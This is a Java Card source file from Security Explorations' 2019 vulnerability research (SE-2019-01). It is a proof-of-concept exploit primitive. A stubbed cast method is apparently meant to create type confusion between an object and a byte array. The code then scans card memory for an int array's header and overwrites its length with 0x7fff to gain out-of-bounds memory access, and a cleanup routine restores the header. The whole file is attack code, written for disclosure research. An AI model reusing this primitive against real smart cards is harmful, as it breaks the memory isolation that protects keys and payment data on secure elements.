/*## (c) SECURITY EXPLORATIONS    2019 poland                                #*/
/*##     http://www.security-explorations.com                                #*/

/* RESEARCH MATERIAL:	SE-2019-01                                            */
/* Security vulnerabilities in Java Card                                      */

/* THIS SOFTWARE IS PROTECTED BY DOMESTIC AND INTERNATIONAL COPYRIGHT LAWS    */
/* UNAUTHORISED COPYING OF THIS SOFTWARE IN EITHER SOURCE OR BINARY FORM IS   */
/* EXPRESSLY FORBIDDEN. ANY USE, INCLUDING THE REPRODUCTION, MODIFICATION,    */
/* DISTRIBUTION, TRANSMISSION, RE-PUBLICATION, STORAGE OR DISPLAY OF ANY      */
/* PART OF THE SOFTWARE, FOR COMMERCIAL OR ANY OTHER PURPOSES REQUIRES A      */
/* VALID LICENSE FROM THE COPYRIGHT HOLDER.                                   */

/* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS    */
/* OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,*/
/* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL    */
/* SECURITY EXPLORATIONS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, */
/* WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF  */
/* OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE     */
/* SOFTWARE.                                                                  */

package com.se.vulns;

public class Cast {
  short len;
  short dummy;

  static Cast c;
  static byte bmem[];
  static int imem[];
  static short imem_off;

  public static final byte BMEM_SIZE = 2;
  public static final byte IMEM_SIZE = 2;

  public static final byte IMEM_OFF_START = 2;
  public static final byte IMEM_OFF_END   = 20;
 
  public Cast() {
   //table length
   len=0x7fff;
  }
    
  public static byte[] cast2tab(byte[] tab,Object o) {
    return tab;
  }

  public static byte[] bmem() {
   if (bmem==null) {
    imem=new int[IMEM_SIZE];
    imem[0]=0x11223344;
    imem[1]=0x55667788;

    c=new Cast();

    bmem=new byte[BMEM_SIZE];
   }

   return cast2tab(bmem,c);
  }

  public static int[] imem() {
   byte bmem[]=bmem();
   
   short off=IMEM_OFF_START;

   while(off<IMEM_OFF_END) {
    if ((bmem[(short)off]==0x00)&&(bmem[(short)(off+1)]==imem.length)) {
     int v1=((int)bmem[(short)(off+2)]&0xff)<<24;
     v1|=((int)bmem[(short)(off+3)]&0xff)<<16;
     v1|=((int)bmem[(short)(off+4)]&0xff)<<8;
     v1|=((int)bmem[(short)(off+5)]&0xff);

     int v2=((int)bmem[(short)(off+6)]&0xff)<<24;
     v2|=((int)bmem[(short)(off+7)]&0xff)<<16;
     v2|=((int)bmem[(short)(off+8)]&0xff)<<8;
     v2|=((int)bmem[(short)(off+9)]&0xff);

     if ((imem[0]==v1)&&(imem[1]==v2)) {
      bmem[(short)off]=(byte)0x7f;
      bmem[(short)(off+1)]=(byte)0xff;
      imem_off=off;
      break;
     }
    } else off++;
   }
		   
   return imem;
  }

  public static void cleanup() {
   byte bmem[]=bmem();
   
   bmem[(short)imem_off]=(byte)0;
   bmem[(short)(imem_off+1)]=(byte)IMEM_SIZE;
  }
}
